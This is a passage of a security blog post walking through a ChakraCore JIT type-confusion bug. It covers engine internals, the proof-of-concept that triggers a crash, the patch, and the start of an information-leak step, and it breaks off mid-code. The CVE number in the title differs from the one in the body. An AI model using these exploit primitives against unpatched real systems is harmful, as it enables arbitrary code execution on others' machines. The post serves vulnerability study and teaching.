<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="This post will cover our journey (Vlad and Reuben&rsquo;s) into the analysis of CVE-2018-0834, a ChakraCore JavaScript engine vulnerability discovered by LokiHardt, and how we exploited the vulnerability in order to get arbitrary code execution.\n"><title>Exploiting CVE-2018-3048 for arbitrary code execution</title>
<link rel=canonical href=https://execc0de.github.io/posts/cve-2018-3408/><link rel=stylesheet href=/scss/style.min.e648dacea474344d0876ae94441e941904084357096d7bdefd568c7a727d6c08.css><meta property='og:title' content="Exploiting CVE-2018-3048 for arbitrary code execution"><meta property='og:description' content="This post will cover our journey (Vlad and Reuben&rsquo;s) into the analysis of CVE-2018-0834, a ChakraCore JavaScript engine vulnerability discovered by LokiHardt, and how we exploited the vulnerability in order to get arbitrary code execution.\n"><meta property='og:url' content='https://execc0de.github.io/posts/cve-2018-3408/'><meta property='og:site_name' content="ExEcc0dE's blog"><meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='chakra'><meta property='article:tag' content='cve-2018-3048'><meta property='article:tag' content='exploit'><meta property='article:published_time' content='2024-10-20T20:59:47+02:00'><meta property='article:modified_time' content='2024-10-20T20:59:47+02:00'><meta property='og:image' content='https://execc0de.github.io/posts/cve-2018-3408/titleimage.png'><meta name=twitter:site content="@reubensammut"><meta name=twitter:creator content="@reubensammut"><meta name=twitter:title content="Exploiting CVE-2018-3048 for arbitrary code execution"><meta name=twitter:description content="This post will cover our journey (Vlad and Reuben&rsquo;s) into the analysis of CVE-2018-0834, a ChakraCore JavaScript engine vulnerability discovered by LokiHardt, and how we exploited the vulnerability in order to get arbitrary code execution.\n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://execc0de.github.io/posts/cve-2018-3408/titleimage.png'></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.setItem(e,"dark")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/avatar_hu11170663487877832059.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>üë®‚Äçüíª</span></figure><div class=site-meta><h1 class=site-name><a href=/>ExEcc0dE's blog</a></h1><h2 class=site-description>poppin' shells</h2></div></header><ol class=menu-social><li><a href=https://github.com/reubensammut target=_blank title=Github rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/reubensammut target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li><li><a href=https://www.linkedin.com/in/reubensammut target=_blank title=LinkedIn rel=me><svg class="icon icon-tabler icon-tabler-brand-linkedin" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="8" y1="11" x2="8" y2="16"/><line x1="8" y1="8" x2="8" y2="8.01"/><path d="m12 16v-5m4 5v-3a2 2 0 00-4 0"/></svg></a></li><li><span>|</span></li><li><a href=https://github.com/SpiralBL0CK target=_blank title=Github rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/f00fc7c800 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li><li><a href=https://www.linkedin.com/in/vatafu-vladut-5886791a8/ target=_blank title=LinkedIn rel=me><svg class="icon icon-tabler icon-tabler-brand-linkedin" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="8" y1="11" x2="8" y2="16"/><line x1="8" y1="8" x2="8" y2="8.01"/><path d="m12 16v-5m4 5v-3a2 2 0 00-4 0"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ul><li><a href=#chakra-internals>Chakra internals</a><ul><li><a href=#number-representation>Number representation</a></li><li><a href=#array-representation>Array representation</a></li></ul></li><li><a href=#triggering-the-vulnerability>Triggering the Vulnerability</a></li><li><a href=#patch-analysis>Patch Analysis</a></li><li><a href=#exploiting-type-confusion>Exploiting Type Confusion</a><ul><li><a href=#infoleak>InfoLeak</a></li><li><a href=#fakeobject-primitive>FakeObject Primitive</a></li><li><a href=#create-arbitrary-readwrite-primitive>Create Arbitrary Read/Write Primitive</a></li></ul></li><li><a href=#code-execution>Code Execution</a><ul><li><a href=#cfg-internals>CFG Internals</a></li><li><a href=#cfg-bypass---return-address-overwrite>CFG Bypass - Return Address Overwrite</a></li><li><a href=#rop-chain>ROP chain</a></li></ul></li><li><a href=#possible-enhancements>Possible enhancements</a></li></ul></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/posts/cve-2018-3408/><img src=/posts/cve-2018-3408/titleimage_hu3620583661294570082.png srcset="/posts/cve-2018-3408/titleimage_hu3620583661294570082.png 800w, /posts/cve-2018-3408/titleimage_hu313842676639715539.png 1600w" width=800 height=348 loading=lazy alt="Featured image of post Exploiting CVE-2018-3048 for arbitrary code execution"></a></div><div class=article-details><header class=article-category><a href=/categories/exploit-dev/>Exploit-Dev</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/cve-2018-3408/>Exploiting CVE-2018-3048 for arbitrary code execution</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Oct 20, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>26 minute read</time></div></footer></div></header><section class=article-content><p>This post will cover our journey (Vlad and Reuben&rsquo;s) into the analysis of CVE-2018-0834, a ChakraCore JavaScript engine vulnerability discovered by LokiHardt, and how we exploited the vulnerability in order to get arbitrary code execution.</p><h2 id=chakra-internals>Chakra internals</h2><h3 id=number-representation>Number representation</h3><p>Before we dive into exploiting this vulnerability, we need to understand how ChakraCore handles values and objects. First off, we&rsquo;ll look into number representation in JavaScript. Generally speaking, numbers can either be represented as integers or 64-bit floating point numbers.
Let&rsquo;s start by looking at integers. Consider the following snippet:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>c</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x41414141</span>
</span></span></code></pre></div><p>When it comes to the internal representation of numbers in memory, ChakraCore uses the upper 17 bits to encode the type information. For integers, the number is XORed with 0x0001000000000000. Thus, the above example of the integer 0x41414141, is represented as 0x0001000041414141.</p><p>Due to the nature of ChakraCore integer representation, it&rsquo;s not possible to use arbitrary 64-bit integers. The highest possible number which can be represented in ChakraCore is 0x7FFFFFFFFFFF. Luckily for us, valid userland addresses range from 0 to 0x7FFFFFFFFFFF, meaning that, for exploitation purposes, this is enough to cover all valid userland addresses.</p><p>One important aspect to note about ChakraCore, is that it always treats numbers as signed. As a simple example, if we take the value 0x7f, where the most significant bit is 0, the number is treated as the positive integer 127. Conversely, the value 0x80, has its most significant bit set to 1, thus, the number is treated as the negative integer -128, rather than the actual value of 128. This could cause issues when we&rsquo;re working with exploits. To counteract this issue, we add 0x100 to the negative value to arrive to the correct number representation, where in this case we would add 256 to -128 to arrive to the correct value of 128. The same technique can be applied to larger numbers such as 32-bit integers. As we go through the exploit, we&rsquo;ll encounter a helper function being used, which does just that. This function is called <code>SignedDwordToUnsignedDword</code>.</p><p>Having familiarised oursevles with the integer representation, let&rsquo;s inspect the floating point number representation. Floating point numbers are represented using the IEEE 754 standard, where the number is split into the sign, exponent and fraction parts as follows.</p><div class=table-wrapper><table><thead><tr><th>Sign</th><th>Exponent</th><th>Fraction</th></tr></thead><tbody><tr><td>1 bit(63)</td><td>11 bits(62-52)</td><td>52 bits(51-0)</td></tr></tbody></table></div><p>Floating point numbers are also encided with the type information. In ChakraCore, this is done by XORing them with 0xFFFC000000000000.</p><h3 id=array-representation>Array representation</h3><p>Next we will be addressing yet another traditional JavaScript object which is the array. Let&rsquo;s investigate how they are represented in memory. Take the following code snippet as an example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>fake_object</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span></code></pre></div><p>This snippet simply creates an array. Looking at the array&rsquo;s representation in the WinDbg debugger, we see the following as an example of a native integer array.</p><p><img src=/posts/cve-2018-3408/nativeintarray.png width=983 height=357 srcset="/posts/cve-2018-3408/nativeintarray_hu6674963407175635540.png 480w, /posts/cve-2018-3408/nativeintarray_hu386494125069693254.png 1024w" loading=lazy alt="Example of a native integer array in memory" class=gallery-image data-flex-grow=275 data-flex-basis=660px></p><p>To better understand the array&rsquo;s representation shown above, the following diagram shows the memory layout to which the array object data can be mapped.</p><script type=module>
    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';

    const lsTheme = localStorage.getItem("theme")
    const hugoTheme = document.body.classList.contains("dark-theme") ? "dark" : null
    const currTheme = lsTheme ? lsTheme : hugoTheme;
    const mermaidTheme = currTheme == "light" ? "default" : "dark"

    mermaid.initialize({theme: mermaidTheme});
</script><div class=mermaid style=align-items:center>block-beta
columns 3
vptr space:2
type space:2
auxSlots space:2
objectArray space:2
length space:2
head space:1 left
space:2 l["length"]
space:2 size
space:2 next
space:2 e0["Element[0]"]
space:2 e1["Element[1]"]
space:2 e2["..."]
space:2 e3["Element[n]"]
space:2 s["(Next Segment)"]
head --> left</div><p>While the layout of arrays in memory is not essential to understand for the purposes of exploiting this vulnerability, it is required to understand it when debugging.</p><p>Across different JavaScript engines, we can typically find the following three types of arrays:</p><ul><li><code>JavascriptNativeIntArray</code></li><li><code>JavascriptNativeFloatArray</code></li><li><code>JavascriptArray</code></li></ul><p>All of the three array types follow the layout shown above.</p><p>Zooming in on <code>JavascriptNativeFloatArray</code> and <code>JavascriptNativeIntArray</code>, the array elements no longer contain the type information encoded since it&rsquo;s implicit in the array type.</p><p>Take as an example the following snippet:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>5.40900888</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>315</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>y</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>5.40900888</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>315</span>];
</span></span></code></pre></div><p>In the variable <code>x</code> above, the floating point number 5.40900888e-315 is represented in memory as 0xFFFC000041414141, however in <code>y</code>, since the type is implicitly encoded in the <code>JavascriptNativeFloatArray</code> array type, the value is no longer XORed with 0xFFFC000000000000, which makes the value in memory 0x0000000041414141.</p><p>The type encoding is used within <code>JavascriptArray</code> as the array could hold a number of different items with different types. In <code>JavascriptArray</code> objects only pointers are not encoded with type information.</p><h2 id=triggering-the-vulnerability>Triggering the Vulnerability</h2><p>In this section, we&rsquo;ll develop an understanding of the code that triggers the vulnerability and observe its effects. Let&rsquo;s start with the proof of concept code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>proto</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1.1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>__proto__</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>proto</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>2.3023</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>320</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>arr</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>10000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, {});
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>arr</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>print</span>(<span style=color:#a6e22e>arr</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>main</span>();
</span></span></code></pre></div><p>In the <code>main</code> function, the <code>opt</code> function gets called 10000 times with the same arguments. This will trigger JIT compilation and since we are passing the same arguments to the function, during optimisation, assumptions are made on the type of the function arguments. In the loop where we&rsquo;re forcing the <code>opt</code> function to be JITed, the arguments we supply are the array <code>arr</code>, along with an empty object <code>{}</code>.</p><p>Inside the <code>opt</code> function, a JSObject is created where the <code>__proto__</code> property is set to the second argument. Due to JIT assumptions made during JITing of the <code>opt</code> function, this will be expected to be a JSObject.</p><p>Following this JIT compilation and execution, the loop is completed and execution returns to the interpreter. A final call is made to the <code>opt</code> function, which violates the assumption of the argument types by specifying the array <code>arr</code> as both first and second parameter. It is not directly clear what effect this will have, but we can observe it by executing the JavaScript code while attached to a debugger.</p><p>To execute the above presented JavaScript code, we&rsquo;ll save the above code in a <code>.js</code> file, open a commmand prompt and start WindDbg Preview while debugging ChakraCore. To do this we execute the following command</p><pre tabindex=0><code>windbgx ch.exe snipper.js
</code></pre><p>Starting the debugging session, a default breakpoint is set at the entry point. When we let execution continue, we observe an access violation as can be seen below:</p><p><img src=/posts/cve-2018-3408/applicationcrash.png width=862 height=176 srcset="/posts/cve-2018-3408/applicationcrash_hu9484172435274885518.png 480w, /posts/cve-2018-3408/applicationcrash_hu2631369723755777759.png 1024w" loading=lazy alt="Application crash in WinDbg" class=gallery-image data-flex-grow=489 data-flex-basis=1175px></p><p>The access violation is due to invalid memory ac cess. Notice that the hexadecimal representation of the float 2.3023e-320 is 0x1234. This value was specifically chosen, since its hexadecimal representation can be very easily detected while debugging. In the above screenshot, we see that the violation is at the address 0x123c which happens to be 0x1234 + 8.</p><h2 id=patch-analysis>Patch Analysis</h2><p>One helpful step before jumping into the exploitation of a patched vulnerability, is to understand what changes have been made to fix said vulnerability. We&rsquo;ll start by looking at the GitHub advisory for this CVE.</p><p><img src=/posts/cve-2018-3408/cvegithubrepo.png width=1893 height=957 srcset="/posts/cve-2018-3408/cvegithubrepo_hu14812204258690258099.png 480w, /posts/cve-2018-3408/cvegithubrepo_hu13231627285505929313.png 1024w" loading=lazy alt="CVE in GitHub repo" class=gallery-image data-flex-grow=197 data-flex-basis=474px></p><p>From the above image we notice that we were provided with a <a class=link href=https://github.com/chakra-core/ChakraCore/commit/6cd503299eac4a5b5ffc0c5bb0d072861f60e183 target=_blank rel=noopener>link to the commit</a> in the ChakraCore repo which fixes this vulnerability. Opening the link shows us that the fix is contained within one commit.</p><p><img src=/posts/cve-2018-3408/bugfix.png width=1072 height=636 srcset="/posts/cve-2018-3408/bugfix_hu4783399013193303835.png 480w, /posts/cve-2018-3408/bugfix_hu14385214049327797096.png 1024w" loading=lazy alt="Commit with the bug fix" class=gallery-image data-flex-grow=168 data-flex-basis=404px></p><p>Let&rsquo;s try to make some sense of this. First of all we see that the changes occured only in one file named <code>GlobOpt.cpp</code>. Inspecting the file we find that the patched function is called <code>CheckJsArrayKills</code>, as can be seen below</p><p><img src=/posts/cve-2018-3408/patchedfunction.png width=767 height=242 srcset="/posts/cve-2018-3408/patchedfunction_hu10281788374253719064.png 480w, /posts/cve-2018-3408/patchedfunction_hu15783628136127999651.png 1024w" loading=lazy alt="Patched function" class=gallery-image data-flex-grow=316 data-flex-basis=760px></p><p>Going over the patch we see it adds a check for the case that the opcode is <code>InitProto</code>, which means that an array has been set as a prototype.</p><p>Analysing the code that was added in this check, the change boils down to calling <code>kills.SetKillsNativeArrays()</code> when the array being used is a native array such as a <code>JavascriptNativeFloatArray</code>. This function sets a flag which is then used within the <code>ProcessValueKills</code> function.</p><p><img src=/posts/cve-2018-3408/killsnativearrays.png width=923 height=386 srcset="/posts/cve-2018-3408/killsnativearrays_hu6316161419878458328.png 480w, /posts/cve-2018-3408/killsnativearrays_hu2510447745200089621.png 1024w" loading=lazy alt="Array data invalidation in case the KillsNativeArrays flag is set" class=gallery-image data-flex-grow=239 data-flex-basis=573px></p><p>The relevant code in this function essentially invalidates the array data when the <code>KillsNativeArrays</code> flag is set, such as when a native array is used as a prototype.</p><h2 id=exploiting-type-confusion>Exploiting Type Confusion</h2><h3 id=infoleak>InfoLeak</h3><p>As we&rsquo;ve seen in the previous sections, the issue lies in the assumption being made by the optimiser in the JIT compiler. When the float array is used as a prototype, it should be converted from a <code>JavascriptNativeFloatArray</code> to a <code>JavascriptVarArray</code>. As the prototype is always assumed to be an empty object, as was the case when we were calling the <code>opt</code> function within the loop, the type change happens, but the array is not invalidated. We can use this bug to our advantage to get our first information leak. Let&rsquo;s start by looking at the <code>opt</code> function once again.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>proto</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1.1</span>;                   <span style=color:#75715e>// [1]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>__proto__</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>proto</span>};   <span style=color:#75715e>// [2]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>2.3023</span><span style=color:#a6e22e>e</span><span style=color:#f92672>-</span><span style=color:#ae81ff>320</span>;           <span style=color:#75715e>// [3]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>Please note that the lines within this function have been annotated with a number for easy reference within this section.</p><p>In order to make the function JIT compiled, we start by calling the <code>opt</code> function a large number of times with the same parameters.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>arr</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>10000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, {});
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>With these calls, the <code>opt</code> function is JITed and the <code>arr</code> parameter in <code>opt</code> is assumed to be a native float array, while the <code>proto</code> parameter is assumed to be an object.</p><p>After the function has been JITed, we call the <code>opt</code> function with the following parameters.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>arr</span>);
</span></span></code></pre></div><p>From the introductory section on arrays, we know that numbers in the float array do not contain the type information. This means that the float array passed to the <code>opt</code> function will not have the upper 17 bits XORed with 0xFFFC. Let&rsquo;s go through what happens in the <code>opt</code> function, after it has been JITed.</p><p>In <code>[1]</code>, the first element of the native float array is set to 1.1. Going on to line <code>[2]</code>, we see that the <code>proto</code> parameter is used as a prototype. For normal objects such as <code>{}</code>, this shouldn&rsquo;t cause any issues, however, a Javascript native array should be converted to a <code>JavascriptVarArray</code>. In our case, this conversion should cause native floats which do not contain the type information, to floats with type information. For the <code>proto</code> parameter, this conversion does happen, however, the array data it contains is not invalidated. This means that in line <code>[3]</code>, the <code>arr</code> parameter is still treated as a native float array, so when assigning the value 2.3023e-320 (which has a memory representation of 0x1234 for ease of identification) to the first index in the array, the type information is not encoded. Since the conversion to <code>JavascriptVarArray</code> happened, when we try to access the non-type encoded value, it will be treated as a pointer. As we saw earlier, accessing an object at 0x1234 is more than likely going to cause an access violation.</p><p>So, how can we use this to our advantage? Let&rsquo;s look at the following change in line <code>[3]</code> in the <code>opt</code> function.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>fake_object</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, 